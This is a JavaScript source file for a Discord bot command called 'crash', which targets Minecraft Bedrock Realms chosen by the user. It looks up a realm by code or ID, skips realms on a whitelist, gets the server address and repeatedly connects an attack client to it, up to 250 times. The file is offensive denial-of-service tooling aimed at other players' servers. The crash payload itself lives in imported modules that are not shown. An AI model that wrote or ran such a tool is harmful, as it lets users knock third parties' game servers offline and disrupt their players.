"use strict";
//didnt use component builder for embeds as there are too many problems when using it
const { EmbedBuilder } = require("discord.js");
const realmAPI = require("../../classes/Realm.js");
const createInstance = require("../../functions/client.js");
const { isProtected } = require("../../functions/whitelist.js");
const { getErrorMessage, errorEmbed } = require("../../functions/errors.js");

let currentlyCrashing = new Map();

module.exports = {
    subCommand: null,
    data: {
        name: 'crash',
        description: 'Cr@sh a realm',

        options: [
            {
                name: 'realm',
                description: 'The realm to connect to',
                type: 3,
                required: true,
                min_length: 6,
                max_length: 17
            },
            {
                name: "loop",
                description: "Amount of times to loop the crash method.",
                type: 4,
                min_value: 1,
                max_value: 250,
                required: false
            }
        ]
    },
    global: true,
    linkOnly: true,

    async execute(interaction, { component, flags, dbUser }) {
        const input = interaction.options.getString('realm');
        const loop = interaction.options.getInteger('loop') || 1;

        if (currentlyCrashing.has(interaction.user.id)) {
            const embed = new EmbedBuilder()
                .setTitle("Crash")
                .setDescription("-# You are already crashing a realm!")
                .setColor(0xFACC15);
            return interaction.reply({ embeds: [embed] });
        }

        await interaction.deferReply();

        const embed = new EmbedBuilder()
            .setTitle("Crash")
            .setDescription(`Resolving realm...\n-# Input: \`${input}\` · Loops: \`${loop}\``)
            .setColor(0x6C8CFF);
        await interaction.editReply({ embeds: [embed] });

        try {
            const RealmAPI = new realmAPI(dbUser);
            await RealmAPI.init();

            let realm = /^\d+$/.test(input)
                ? await RealmAPI.getRealmInfoByID(input)
                : await RealmAPI.getRealmInfo(input, false);

            if (realm?.status && realm.status !== 200) {
                return interaction.editReply({
                    embeds: [errorEmbed("Crash", null, getErrorMessage({ errorMsg: `${realm.body?.errorMsg || 'Unknown'} ${realm.body?.errorCode || realm.status}` }))]
                });
            }

            if (realm?.body?.errorMsg) {
                return interaction.editReply({
                    embeds: [errorEmbed("Crash", null, getErrorMessage(realm.body))]
                });
            }

            if (realm?.body) realm = realm.body;

            if (realm?.state === "CLOSED" || realm?.closed) {
                return interaction.editReply({ embeds: [errorEmbed("Crash", realm, "Realm is closed")] });
            }

            if (realm?.expired) {
                return interaction.editReply({ embeds: [errorEmbed("Crash", realm, "Realm is expired")] });
            }

            if (!realm || !realm.id) {
                return interaction.editReply({ embeds: [errorEmbed("Crash", null, "Realm not found")] });
            }

            const alreadyProtected = await isProtected(realm.id).catch(() => false);
            if (alreadyProtected) {
                return interaction.editReply({ embeds: [errorEmbed("Crash", realm, "Whitelisted")] });
            }

            let check = await RealmAPI.doRealmChecks(realm, null);
            if (check?.errorMsg) {
                return interaction.editReply({ embeds: [errorEmbed("Crash", realm, getErrorMessage(check))] });
            }

            delete realm.players;
            currentlyCrashing.set(interaction.user.id, true);

            const runningEmbed = new EmbedBuilder()
                .setTitle("Crash")
                .setDescription(`**${realm.name}** · \`${realm.id}\`\n-# Running \`${loop}\` loops...`)
                .setColor(0x4ADE80);
            await interaction.editReply({ embeds: [runningEmbed] });

            for (let i = 0; i < loop; i++) {
                const host = await RealmAPI.getRealmIP(realm.id);
                check = await RealmAPI.doRealmChecks(null, host);
                if (check?.errorMsg) continue;
                if (host?.body?.networkProtocol !== "NETHERNET_JSONRPC") continue;

                await createInstance(realm, dbUser, {
                    protocol: host.body.networkProtocol,
                    address: host.body.address,
                    external: { enabled: true, type: 3 }
                }, RealmAPI);

                await new Promise(resolve => setTimeout(resolve, 15000));
            }

            currentlyCrashing.delete(interaction.user.id);

            const doneEmbed = new EmbedBuilder()
                .setTitle("Crash")
                .setDescription(`**${realm.name}** · \`${realm.id}\`\n-# Completed \`${loop}\` loops ✅`)
                .setColor(0x4ADE80);
            return interaction.editReply({ embeds: [doneEmbed] }).catch(() => {});

        } catch (error) {
            console.error(error);
            currentlyCrashing.delete(interaction.user.id);
        }
    }
};

module.exports.currentlyCrashing = currentlyCrashing;
